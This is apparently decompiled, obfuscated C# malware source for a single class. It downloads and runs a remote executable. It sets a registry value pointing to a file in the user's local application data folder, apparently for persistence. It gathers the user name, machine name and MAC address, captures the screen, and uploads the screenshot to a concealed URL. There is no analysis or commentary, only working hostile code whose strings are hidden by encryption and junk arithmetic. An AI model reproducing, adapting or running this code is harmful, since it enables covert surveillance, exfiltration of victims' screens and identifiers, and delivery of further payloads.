using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class db
{
	private static string m_a;

	private static string m_b;

	private static string c;

	private static string d;

	private static string e;

	private static string f;

	private static Bitmap g;

	private unsafe static void a(string[] args)
	{
		eb.d = new byte[116];
		((sbyte[])eb.d)[0] = 14;
		((sbyte[])eb.d)[1] = 113;
		((sbyte[])eb.d)[2] = 111;
		((sbyte[])eb.d)[3] = -101;
		((sbyte[])eb.d)[4] = -82;
		((sbyte[])eb.d)[5] = -120;
		((sbyte[])eb.d)[6] = -83;
		((sbyte[])eb.d)[7] = 119;
		((sbyte[])eb.d)[8] = 73;
		((sbyte[])eb.d)[9] = sbyte.MaxValue;
		((sbyte[])eb.d)[10] = 113;
		((sbyte[])eb.d)[11] = -89;
		((sbyte[])eb.d)[12] = -61;
		((sbyte[])eb.d)[13] = 74;
		((sbyte[])eb.d)[14] = 21;
		((sbyte[])eb.d)[15] = -53;
		((sbyte[])eb.d)[16] = 88;
		((sbyte[])eb.d)[17] = -28;
		((sbyte[])eb.d)[18] = 60;
		((sbyte[])eb.d)[19] = 51;
		((sbyte[])eb.d)[20] = 47;
		((sbyte[])eb.d)[21] = 106;
		((sbyte[])eb.d)[22] = 30;
		((sbyte[])eb.d)[23] = 97;
		((sbyte[])eb.d)[24] = -54;
		((sbyte[])eb.d)[25] = 10;
		((sbyte[])eb.d)[26] = -59;
		((sbyte[])eb.d)[27] = sbyte.MinValue;
		((sbyte[])eb.d)[28] = 126;
		((sbyte[])eb.d)[29] = -36;
		((sbyte[])eb.d)[30] = -10;
		((sbyte[])eb.d)[31] = 76;
		((sbyte[])eb.d)[32] = 80;
		((sbyte[])eb.d)[33] = 0;
		((sbyte[])eb.d)[34] = 0;
		((sbyte[])eb.d)[35] = 0;
		((sbyte[])eb.d)[36] = 78;
		((sbyte[])eb.d)[37] = -38;
		((sbyte[])eb.d)[38] = 89;
		((sbyte[])eb.d)[39] = 65;
		((sbyte[])eb.d)[40] = 27;
		((sbyte[])eb.d)[41] = -18;
		((sbyte[])eb.d)[42] = -88;
		((sbyte[])eb.d)[43] = -45;
		((sbyte[])eb.d)[44] = -39;
		((sbyte[])eb.d)[45] = 107;
		((sbyte[])eb.d)[46] = -55;
		((sbyte[])eb.d)[47] = -38;
		((sbyte[])eb.d)[48] = -17;
		((sbyte[])eb.d)[49] = -126;
		((sbyte[])eb.d)[50] = -63;
		((sbyte[])eb.d)[51] = -52;
		((sbyte[])eb.d)[52] = -5;
		((sbyte[])eb.d)[53] = -77;
		((sbyte[])eb.d)[54] = 56;
		((sbyte[])eb.d)[55] = -109;
		((sbyte[])eb.d)[56] = 25;
		((sbyte[])eb.d)[57] = 118;
		((sbyte[])eb.d)[58] = -70;
		((sbyte[])eb.d)[59] = 42;
		((sbyte[])eb.d)[60] = -35;
		((sbyte[])eb.d)[61] = -93;
		((sbyte[])eb.d)[62] = 120;
		((sbyte[])eb.d)[63] = 118;
		((sbyte[])eb.d)[64] = 40;
		((sbyte[])eb.d)[65] = 70;
		((sbyte[])eb.d)[66] = 74;
		((sbyte[])eb.d)[67] = -24;
		((sbyte[])eb.d)[68] = 107;
		((sbyte[])eb.d)[69] = -80;
		((sbyte[])eb.d)[70] = 33;
		((sbyte[])eb.d)[71] = -59;
		((sbyte[])eb.d)[72] = 24;
		((sbyte[])eb.d)[73] = 13;
		((sbyte[])eb.d)[74] = -85;
		((sbyte[])eb.d)[75] = 0;
		((sbyte[])eb.d)[76] = -6;
		((sbyte[])eb.d)[77] = 57;
		((sbyte[])eb.d)[78] = -73;
		((sbyte[])eb.d)[79] = 15;
		((sbyte[])eb.d)[80] = -117;
		((sbyte[])eb.d)[81] = 101;
		((sbyte[])eb.d)[82] = -48;
		((sbyte[])eb.d)[83] = 14;
		((sbyte[])eb.d)[84] = 103;
		((sbyte[])eb.d)[85] = -17;
		((sbyte[])eb.d)[86] = 118;
		((sbyte[])eb.d)[87] = -6;
		((sbyte[])eb.d)[88] = 70;
		((sbyte[])eb.d)[89] = 3;
		((sbyte[])eb.d)[90] = -22;
		((sbyte[])eb.d)[91] = -120;
		((sbyte[])eb.d)[92] = -3;
		((sbyte[])eb.d)[93] = 91;
		((sbyte[])eb.d)[94] = -52;
		((sbyte[])eb.d)[95] = 35;
		((sbyte[])eb.d)[96] = 71;
		((sbyte[])eb.d)[97] = 111;
		((sbyte[])eb.d)[98] = -10;
		((sbyte[])eb.d)[99] = 97;
		((sbyte[])eb.d)[100] = 54;
		((sbyte[])eb.d)[101] = -110;
		((sbyte[])eb.d)[102] = 108;
		((sbyte[])eb.d)[103] = 87;
		((sbyte[])eb.d)[104] = -78;
		((sbyte[])eb.d)[105] = 10;
		((sbyte[])eb.d)[106] = -51;
		((sbyte[])eb.d)[107] = -108;
		((sbyte[])eb.d)[108] = 75;
		((sbyte[])eb.d)[109] = -97;
		((sbyte[])eb.d)[110] = -18;
		((sbyte[])eb.d)[111] = 35;
		((sbyte[])eb.d)[112] = -71;
		((sbyte[])eb.d)[113] = 20;
		((sbyte[])eb.d)[114] = -36;
		((sbyte[])eb.d)[115] = -65;
		string string_ = Path.GetTempPath() + db.m_b;
		string string_2 = db.m_a;
		_003CModule_003E.s = 0;
		b(string_, string_2);
		Graphics val = default(Graphics);
		_003CModule_003E.a = val;
		string h = default(string);
		_003CModule_003E.h = h;
		TimeSpan timeSpan = default(TimeSpan);
		object i = timeSpan;
		_003CModule_003E.k = 0;
		_003CModule_003E.i = i;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		int int_ = sizeof(byte) + 8734;
		int o = _003CModule_003E.o;
		nint num;
		int j = default(int);
		int num2 = default(int);
		if (706 * o + 318 * o == -1121904995)
		{
			if ((0xC4800000u & ((uint)o ^ (1024 * ((uint)o >> 10)))) == 0)
			{
				num = -1084376801;
			}
			else if (((uint)(256 * (o * 2 + 2 * o)) ^ 0x23F6u) != 0)
			{
				num = (nint)Type.EmptyTypes.LongLength + -883080863;
			}
			else
			{
				j = _003CModule_003E.j;
				if ((((uint)j / 243535204u - 2083872659) ^ 0x20001069u) != 0)
				{
					num2 = -1948253384;
					num = num2;
				}
				else
				{
					num = sizeof(byte) + -1817423858;
				}
			}
		}
		else
		{
			num = sizeof(double) + 9651;
		}
		string text = _003CModule_003E.c(int_, (int)num, (int)((nint)Type.EmptyTypes.LongLength + 53));
		_003CModule_003E.p = 1692737957;
		b(folderPath + text + e, d);
		RegistryKey currentUser = Registry.CurrentUser;
		int int_2 = ((((uint)((j & 0x25FA) + -3184) ^ 0x5C3u) != 0) ? (sizeof(float) + 16523) : (sizeof(uint) + 1007959277));
		nint intPtr = (((0x6000000 & (j << 27)) != ((1610612736 * j) & 0x6000000)) ? (sizeof(ushort) + 1244677625) : ((((j * 4194304) | -2779) == -2779) ? (sizeof(Guid) + 17462) : (((((uint)num2 / 482849u) & 0x6C6A0000u) != 0) ? (sizeof(byte) + 1963648085) : ((nint)Type.EmptyTypes.LongLength + -1293528449))));
		int p = _003CModule_003E.p;
		RegistryKey registryKey = currentUser.CreateSubKey(_003CModule_003E.c(int_2, (int)intPtr, (int)((67108864 * p == -2113189576) ? (-2044828275) : ((nint)Type.EmptyTypes.LongLength + 221))));
		int num7 = default(int);
		int num6 = default(int);
		try
		{
			_003CModule_003E.e = -1719097159;
			string text2 = e;
			nint num4;
			if ((0x68A4187E ^ (14 * (j << 4) + (j << 4) * 2)) == 0)
			{
				if ((1 & ((j + -7957) ^ (j + 3395))) == 0)
				{
					int num3;
					if ((0x7FFFFFFF | ((uint)j % 529236488u)) != int.MaxValue)
					{
						num3 = sizeof(float) + 2142717188;
						num4 = num3;
					}
					else
					{
						num3 = sizeof(ulong) + 1613948371;
						num4 = num3;
					}
				}
				else
				{
					num4 = (nint)Type.EmptyTypes.LongLength + -1623852593;
				}
			}
			else
			{
				num4 = sizeof(short) + 20966;
			}
			nint num5 = (nint)Type.EmptyTypes.LongLength + 21850;
			nint num8;
			if ((0x8A00 & ((4456960 * (0x70A33CC5 | num6)) | num6)) == 35328)
			{
				num8 = ((num7 * 10 + num7 * 54 == -8698) ? 2115325419 : (((((uint)o / 268435456u) | 0x1B4F) != 6991) ? ((6794240 + (num7 << 6) * 4 != (int)((uint)(630194176 * num7) >> 12)) ? ((nint)Type.EmptyTypes.LongLength + -1869347401) : ((nint)Type.EmptyTypes.LongLength + 2019269188)) : (((uint)num7 / 438u == 913181400) ? (sizeof(ushort) + 798566731) : ((nint)Type.EmptyTypes.LongLength + 185))));
			}
			else if ((uint)num7 / 242792884u != 1548260844)
			{
				int o2 = _003CModule_003E.o;
				num8 = (((-1764 | -(o2 << 19)) != -1764) ? (sizeof(float) + -1495913984) : ((694478600 + -798085120 * o == 454261308) ? ((nint)Type.EmptyTypes.LongLength + -872673048) : ((nint)Type.EmptyTypes.LongLength + -1095482108)));
			}
			else
			{
				num8 = -1917925188;
			}
			string name = text2.Replace(_003CModule_003E.c((int)num4, (int)num5, (int)num8), _003CModule_003E.c(sizeof(double) + 21171, sizeof(Guid) + 22168, 152));
			string value = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 70706), (int)((nint)Type.EmptyTypes.LongLength + 71738), sizeof(ushort) + 126) + e;
			eb.c = -1986800246;
			registryKey.SetValue(name, value);
			_003CModule_003E.q = -1356723602;
			_003CModule_003E.r = num6;
			registryKey.Close();
		}
		catch
		{
		}
		_003CModule_003E.i = num7;
		_003CModule_003E.l = num6;
		Random random = new Random();
		DateTime utcNow = DateTime.UtcNow;
		_003CModule_003E.e = val;
		int num9 = (int)(utcNow - new DateTime(1970, 1, 1)).TotalSeconds;
		_003CModule_003E.p = -2132993055;
		num6 = num9;
		int num10 = num6;
		int num11 = random.Next(100, 100000);
		_003CModule_003E.s = num7;
		string obj3 = string.Concat(str2: (num10 + num11).ToString(), str0: Environment.GetFolderPath(Environment.SpecialFolder.InternetCache), str1: _003CModule_003E.c(sizeof(Guid) + 53575, sizeof(long) + 54386, (12864 + (o << 11) + 730863921 != 64 * (o + o)) ? 102 : (sizeof(double) + 1606041703)), str3: _003CModule_003E.c(71917, (((uint)((-67101212 | o) - -1556) ^ 0x147Fu) != 0) ? 72935 : 1551479799, sizeof(double) + 227));
		_003CModule_003E.n = num6;
		h = obj3;
		val = Graphics.FromImage((Image)(object)g);
		val.CopyFromScreen(0, 0, 0, 0, ((Image)g).get_Size());
		((Image)g).Save(h);
		a(f, h);
		if (File.Exists(h))
		{
			File.Delete(h);
		}
	}

	private static string a(string string_0, string string_1)
	{
		WebClient webClient = new WebClient();
		byte[] bytes = webClient.UploadFile(string_0, _003CModule_003E.c(23597, (int)((nint)Type.EmptyTypes.LongLength + 24590), 24), string_1);
		Encoding.ASCII.GetString(bytes);
		return null;
	}

	private static string a()
	{
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		string empty = string.Empty;
		IPInterfaceProperties iPProperties = default(IPInterfaceProperties);
		_003CModule_003E.a = iPProperties;
		string text = empty;
		_003CModule_003E.k = 0;
		_003CModule_003E.s = -1353483070;
		NetworkInterface[] array = allNetworkInterfaces;
		_003CModule_003E.g = -1475622531;
		int num = 0;
		while (true)
		{
			eb.c = iPProperties;
			int num2 = num;
			IntPtr intPtr = (nint)array.LongLength;
			_003CModule_003E.n = num;
			if (num2 >= (int)(nint)intPtr)
			{
				break;
			}
			_003CModule_003E.n = 1553619039;
			_003CModule_003E.r = 1868340583;
			NetworkInterface networkInterface = array[num];
			bool num3 = !(text == string.Empty);
			_003CModule_003E.n = 686049056;
			_003CModule_003E.o = num;
			_003CModule_003E.p = 58455427;
			if (!num3)
			{
				eb.c = array;
				iPProperties = networkInterface.GetIPProperties();
				_003CModule_003E.q = num;
				text = networkInterface.GetPhysicalAddress().ToString();
			}
			_003CModule_003E.f = null;
			object obj = 1338800510;
			_003CModule_003E.k = -1301115349;
			_003CModule_003E.a = obj;
			int num4 = num + 1;
			nint num5 = (nint)Type.EmptyTypes.LongLength + 52126;
			nint num6 = (nint)Type.EmptyTypes.LongLength + 52866;
			nint num7;
			if ((1 & -num) != (int)(((uint)(436 * num + 588 * num) >> 10) & 1))
			{
				if (num * 1946 + num * 102 == 9626)
				{
				}
				num7 = 939755321;
			}
			else
			{
				num7 = (nint)Type.EmptyTypes.LongLength + 169;
			}
			_003CModule_003E.d = _003CModule_003E.c((int)num5, (int)num6, (int)num7);
			num = num4;
		}
		string result = text;
		_003CModule_003E.o = num;
		_003CModule_003E.f = null;
		_003CModule_003E.m = num;
		_003CModule_003E.s = 1733093820;
		_003CModule_003E.a = allNetworkInterfaces;
		return result;
	}

	private unsafe static string b(string string_0, string string_1)
	{
		WebClient webClient = new WebClient();
		Uri address = new Uri(string_1);
		Process process = default(Process);
		_003CModule_003E.e = process;
		_003CModule_003E.i = null;
		webClient.DownloadFileAsync(address, string_0);
		_003CModule_003E.f = process;
		Process process2 = new Process();
		_003CModule_003E.e = false;
		process = process2;
		process.StartInfo.FileName = string_0;
		bool flag;
		while (true)
		{
			_003CModule_003E.h = -1746493602;
			long length = new FileInfo(string_0).Length;
			eb.c = -807617032;
			_003CModule_003E.a = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 3548), sizeof(byte) + 4648, sizeof(Guid) + 188);
			_003CModule_003E.r = -955119421;
			_003CModule_003E.d = null;
			if (!(flag = length == 0L))
			{
				break;
			}
			Thread.Sleep(500);
		}
		Thread.Sleep(5000);
		try
		{
			process.Start();
		}
		catch
		{
			_003CModule_003E.h = null;
			_003CModule_003E.c = _003CModule_003E.c(22373, (int)((nint)Type.EmptyTypes.LongLength + 23043), (int)((nint)Type.EmptyTypes.LongLength + 175));
			_003CModule_003E.l = 1983974977;
			_003CModule_003E.a = flag;
		}
		string result = null;
		_003CModule_003E.k = 1938417372;
		return result;
	}

	unsafe static db()
	{
		//IL_03c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d9: Expected O, but got Unknown
		int int_ = sizeof(double) + 21837;
		int o = _003CModule_003E.o;
		db.m_a = _003CModule_003E.c(int_, (int)((o + o - 1262 != 2 * -o) ? ((nint)Type.EmptyTypes.LongLength + 22490) : (sizeof(uint) + -1894668190)), (int)((nint)Type.EmptyTypes.LongLength + 138));
		int num;
		nint num2;
		int p = default(int);
		int m = default(int);
		if ((0x8000D97 & ~((uint)o / 24460871u)) == 0)
		{
			num = -2098644010;
			num2 = num;
		}
		else
		{
			p = _003CModule_003E.p;
			if ((uint)p / 16u == 2329935330u)
			{
				num = sizeof(ulong) + 1085005976;
				num2 = num;
			}
			else
			{
				m = _003CModule_003E.m;
				if (((0x8DA5A3D3u ^ (uint)(m * -1207959552)) & 0x28Fu) != 0)
				{
					num2 = (((0x4000039E ^ ((uint)m % 22u / 647u)) == 0) ? ((nint)Type.EmptyTypes.LongLength + -1227538792) : ((nint)Type.EmptyTypes.LongLength + 27960));
				}
				else
				{
					num = 2117792670;
					num2 = num;
				}
			}
		}
		db.m_b = _003CModule_003E.c(26712, (int)num2, (int)((nint)Type.EmptyTypes.LongLength + 142));
		c = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + -319), (int)((nint)Type.EmptyTypes.LongLength + 408), 151);
		d = c + _003CModule_003E.c(sizeof(float) + 69333, sizeof(ushort) + 70041, sizeof(ulong) + 174);
		e = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 14769), (int)((nint)Type.EmptyTypes.LongLength + 16098), 147);
		string[] array = new string[8]
		{
			c,
			_003CModule_003E.c(sizeof(ushort) + 46049, (int)(((0xFFFFFEDFu | ((uint)m / 57196u >> 13)) != 4294967007u) ? (-1831687780) : ((nint)Type.EmptyTypes.LongLength + 47311)), (int)((nint)Type.EmptyTypes.LongLength + 213)),
			Environment.UserName,
			null,
			null,
			null,
			null,
			null
		};
		int l = _003CModule_003E.l;
		array[3] = _003CModule_003E.c((int)((111 * l + 17 * l == -9417) ? (sizeof(double) + 1432421147) : ((nint)Type.EmptyTypes.LongLength + 47928)), (int)((nint)Type.EmptyTypes.LongLength + 48525), (int)(((0xA1EFu ^ (uint)(p * 1483210752 + 4867)) != 0) ? (sizeof(uint) + 48) : ((~m == -(m | 0x22CC)) ? ((nint)Type.EmptyTypes.LongLength + 1845001775) : ((nint)Type.EmptyTypes.LongLength + 708394979))));
		array[4] = Environment.MachineName;
		_003CModule_003E.a = null;
		nint num3 = (nint)Type.EmptyTypes.LongLength + 34691;
		int int_2 = 35197;
		nint num5;
		if ((0 - (uint)m / 11u) % 64610054u == 2041567538)
		{
			int num4;
			if (128 * l * 1048576 - 1258240 == l * 225 + l * 287)
			{
				num4 = -969609830;
				num5 = num4;
			}
			else if ((((p << 9) + 1369223498) & 0x11C) == 264)
			{
				if (((uint)(-(0x3BB4C620 & o)) ^ 0x17E3u) != 0)
				{
					num4 = sizeof(long) + 2105939388;
					num5 = num4;
				}
				else
				{
					num5 = (nint)Type.EmptyTypes.LongLength + 1151057333;
				}
			}
			else
			{
				num5 = (nint)Type.EmptyTypes.LongLength + -559255844;
			}
		}
		else
		{
			num5 = 177;
		}
		string text = _003CModule_003E.c((int)num3, int_2, (int)num5);
		_003CModule_003E.p = -1637483752;
		array[5] = text;
		array[6] = a();
		array[7] = _003CModule_003E.c(22929, sizeof(Guid) + 23326, (int)((nint)Type.EmptyTypes.LongLength + 167));
		_003CModule_003E.m = 1207898484;
		f = string.Concat(array);
		_003CModule_003E.j = 805037514;
		eb.c = array;
		int width = Screen.get_PrimaryScreen().get_Bounds().Width;
		Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
		_003CModule_003E.c = null;
		_003CModule_003E.l = 1726177009;
		Bitmap val = new Bitmap(width, bounds.Height);
		_003CModule_003E.l = 863492941;
		g = val;
	}
}
